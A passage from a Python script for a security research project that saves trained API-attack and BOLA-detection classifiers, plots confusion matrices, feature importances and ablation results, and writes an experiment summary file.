    "random_seed": RANDOM_SEED,
    "training_date": datetime.now().isoformat(),
    "python_version": sys.version.split()[0],
    "test_metrics": {
        "random_forest": {
            "accuracy": round(accuracy_score(y_bola_te, te_bola_preds_rf), 4),
            "bola_f1": round(bola_rep_rf["BOLA"]["f1-score"], 4),
            "normal_f1": round(bola_rep_rf["NORMAL"]["f1-score"], 4),
            "roc_auc": round(roc_auc_score(y_bola_te, te_bola_probs_rf), 4)
        }
    }
}
with open(os.path.join(MODELS_DIR, "bola", "model_metadata.json"), "w") as f:
    json.dump(bola_meta, f, indent=2)

print("[+] All model files and metadata saved under models/atrdf/ and models/bola/")

# =====================================================================
# 10. GENERATING PUBLICATION RESEARCH FIGURES
# =====================================================================
print("\n" + "="*60)
print("[Phase 6d] GENERATING PUBLICATION-QUALITY RESEARCH FIGURES")
print("="*60)

plt.style.use('seaborn-v0_8-whitegrid' if 'seaborn-v0_8-whitegrid' in plt.style.available else 'default')

# Figure 1: ATRDF Binary Confusion Matrix
fig, ax = plt.subplots(figsize=(6, 5), dpi=300)
sns.heatmap(cm_atr_bin_rf, annot=True, fmt='d', cmap='Blues', cbar=False,
            xticklabels=['Benign', 'Malicious'], yticklabels=['Benign', 'Malicious'], ax=ax)
ax.set_title("Figure 1: ATRDF Binary RF Confusion Matrix (Test Set)", fontsize=12, pad=12)
ax.set_xlabel("Predicted Label", fontsize=10)
ax.set_ylabel("True Label", fontsize=10)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig1_atrdf_binary_confusion_matrix.png"))
plt.close()

# Figure 2: ATRDF Multiclass Confusion Matrix
cm_multi = confusion_matrix(y_te_multi, preds_multi_rf)
fig, ax = plt.subplots(figsize=(8, 6.5), dpi=300)
sns.heatmap(cm_multi, annot=True, fmt='d', cmap='YlGnBu', cbar=True,
            xticklabels=classes_mal, yticklabels=classes_mal, ax=ax)
ax.set_title("Figure 2: ATRDF Multiclass RF Confusion Matrix (Test Set)", fontsize=12, pad=12)
ax.set_xlabel("Predicted Attack Type", fontsize=10)
ax.set_ylabel("True Attack Type", fontsize=10)
plt.xticks(rotation=45, ha='right')
plt.yticks(rotation=0)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig2_atrdf_multiclass_confusion_matrix.png"))
plt.close()

# Figure 3: BOLA Confusion Matrix
cm_bola = confusion_matrix(y_bola_te, te_bola_preds_rf)
fig, ax = plt.subplots(figsize=(6, 5), dpi=300)
sns.heatmap(cm_bola, annot=True, fmt='d', cmap='Purples', cbar=False,
            xticklabels=['NORMAL', 'BOLA'], yticklabels=['NORMAL', 'BOLA'], ax=ax)
ax.set_title("Figure 3: BOLA Behavioral RF Confusion Matrix (Untouched Sessions)", fontsize=12, pad=12)
ax.set_xlabel("Predicted Class", fontsize=10)
ax.set_ylabel("True Class", fontsize=10)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig3_bola_confusion_matrix.png"))
plt.close()

# Figure 4: Feature Importance ATRDF (Top 10)
fig, ax = plt.subplots(figsize=(8, 5), dpi=300)
top10_atr = fi_atr_bin.head(10)
sns.barplot(data=top10_atr, x="Importance", y="Feature", palette="Blues_r", ax=ax)
ax.set_title("Figure 4: Top 10 Predictive Signals - ATRDF Binary RF", fontsize=12, pad=12)
ax.set_xlabel("Mean Decrease in Impurity (Gini Importance)", fontsize=10)
ax.set_ylabel("Request Feature", fontsize=10)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig4_feature_importance_atrdf.png"))
plt.close()

# Figure 5: Feature Importance BOLA
fig, ax = plt.subplots(figsize=(8, 5), dpi=300)
top10_bola = fi_bola.head(10)
sns.barplot(data=top10_bola, x="Importance", y="Feature", palette="Purples_r", ax=ax)
ax.set_title("Figure 5: Top 10 Behavioral Signals - BOLA Session RF (W=10)", fontsize=12, pad=12)
ax.set_xlabel("Mean Decrease in Impurity (Gini Importance)", fontsize=10)
ax.set_ylabel("Behavioral Feature", fontsize=10)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig5_feature_importance_bola.png"))
plt.close()

# Figure 6: Feature Ablation Comparison
df_abl = pd.DataFrame(ablation_results)
fig, ax = plt.subplots(figsize=(8, 4.5), dpi=300)
sns.barplot(data=df_abl[df_abl['Model'] == 'Random Forest'], x="Feature Set", y="Macro F1", palette="Blues_d", ax=ax)
ax.set_title("Figure 6: Feature Set Ablation Trade-off (Random Forest)", fontsize=12, pad=12)
ax.set_ylabel("Macro F1-Score", fontsize=10)
ax.set_ylim(0.8, 1.0)
for p in ax.patches:
    ax.annotate(f"{p.get_height():.4f}", (p.get_x() + p.get_width() / 2., p.get_height() - 0.03),
                ha='center', va='center', color='white', fontweight='bold', fontsize=10)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig6_ablation_comparison.png"))
plt.close()

# Figure 7: Unseen Attack Generalization
df_unseen = pd.DataFrame(unseen_results)
fig, ax = plt.subplots(figsize=(9, 4.8), dpi=300)
sns.barplot(data=df_unseen, x="Held-out Attack", y="Recall", palette="crest", ax=ax)
ax.set_title("Figure 7: Leave-One-Attack-Out Zero-Day Detection Recall", fontsize=12, pad=12)
ax.set_ylabel("Malicious Recall (Detection Rate)", fontsize=10)
ax.set_xlabel("Held-out Attack Family", fontsize=10)
plt.xticks(rotation=30, ha='right')
ax.set_ylim(0, 1.05)
for p in ax.patches:
    ax.annotate(f"{p.get_height():.2%}", (p.get_x() + p.get_width() / 2., p.get_height() + 0.02),
                ha='center', va='bottom', fontsize=9)
plt.tight_layout()
plt.savefig(os.path.join(RESULTS_FIGURES, "fig7_unseen_attack_generalization.png"))
plt.close()

# Experiment Summary JSON
exp_summary = {
    "experiment_id": "EXP-2026-FINAL",
    "timestamp": datetime.now().isoformat(),
    "random_seed": RANDOM_SEED,
    "atrdf_binary_f1": round(f1_rf, 4),
    "atrdf_multiclass_macro_f1": round(f1_score(y_te_multi, preds_multi_rf, average='macro'), 4),
    "bola_f1": round(bola_rep_rf["BOLA"]["f1-score"], 4),
    "table_outputs": [
        "TABLE_1_dataset_summary.csv",
        "TABLE_2_attack_classes.csv",
        "TABLE_3_feature_sets.csv",
        "TABLE_4_binary_classification.csv",
        "TABLE_5_multiclass_classification.csv",
        "TABLE_5b_per_class_metrics.csv",
        "TABLE_6_bola_classification.csv",
        "TABLE_7_ablation.csv",
        "TABLE_8_unseen_attacks.csv"
    ],
    "figure_outputs": [
        "fig1_atrdf_binary_confusion_matrix.png",
        "fig2_atrdf_multiclass_confusion_matrix.png",
        "fig3_bola_confusion_matrix.png",
        "fig4_feature_importance_atrdf.png",
        "fig5_feature_importance_bola.png",
        "fig6_ablation_comparison.png",
        "fig7_unseen_attack_generalization.png"
    ]
}
with open(os.path.join(RESULTS_TABLES, "experiment_summary.json"), "w") as f:
    json.dump(exp_summary, f, indent=2)

print("\n" + "="*60)
print("[+] COMPLETED ALL PHASES: DATASET AUDIT, TRAINING, EVALUATION, AND ARTIFACT GENERATION")
print("="*60)
